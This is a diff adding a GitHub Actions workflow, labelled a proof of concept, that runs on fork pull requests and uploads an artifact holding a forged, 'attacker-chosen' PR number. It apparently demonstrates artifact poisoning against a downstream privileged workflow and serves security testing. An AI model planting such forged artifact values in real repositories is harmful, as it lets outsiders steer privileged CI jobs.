@@ -1,0 +1,21 @@
+name: POC Build PR From Fork
+on:
+  pull_request:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  build:
+    if: github.event.pull_request.head.repo.full_name != github.event.pull_request.base.repo.full_name
+    runs-on: ubuntu-latest
+    steps:
+      - name: forged build
+        run: |
+          echo "FORGED_UPSTREAM_VERSION_RAN"
+          mkdir -p __pr
+          # attacker-chosen PR number, not the real PR number
+          echo "3" > __pr/NUM
+      - uses: actions/upload-artifact@v4
+        with:
+          name: pr
+          path: __pr/
